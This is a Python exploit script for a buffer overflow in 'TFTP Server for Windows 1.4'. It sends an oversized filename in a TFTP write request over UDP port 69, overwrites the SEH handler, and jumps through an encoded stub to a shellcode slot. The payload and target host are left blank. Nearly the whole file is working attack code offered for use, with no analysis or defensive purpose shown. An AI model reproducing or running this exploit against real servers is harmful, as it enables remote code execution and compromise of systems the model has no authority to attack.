#!/usr/bin/python
# TFTP Server for Windows 1.4 Write Request "Filename" Buffer Overflow
# Operating Systems Tested:
# 	Windows Vista (x86)
# Bad Characters: \x00\x2f
# SEH Offset: 1232
import sys
import socket

payload = ""

RHOST = ""

SEH = "\xb6\xf3\x40"
nSEH = "\xEB\x9A\x90\x90"
jump =  ""
jump += "\xbb\xa3\x57\xdc\x37\xda\xd5\xd9\x74\x24\xf4\x5a\x31"
jump += "\xc9\xb1\x05\x31\x5a\x14\x83\xea\xfc\x03\x5a\x10\x41"
jump += "\xa2\x05\xd9\x5c\x39\x92\xd2\x07\x42\x1b\x10\x36\xab"
jump += "\x1c\x26\x38\x2c\xe2\xc8"
buffer = ""
buffer += "\x00\x02"
buffer += "\x90" * 360
buffer += payload
buffer += "\x90" * (1232 - 360 - len(payload) - len(jump) - 16 - 4)
buffer += jump
buffer += "\x90" * 16
buffer += nSEH
buffer += SEH
buffer += "\x00netascii\x00"
print("[*] Sending exploit")
connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
connection.sendto(buffer, (RHOST, 69))
print("[*] Exploit sent")
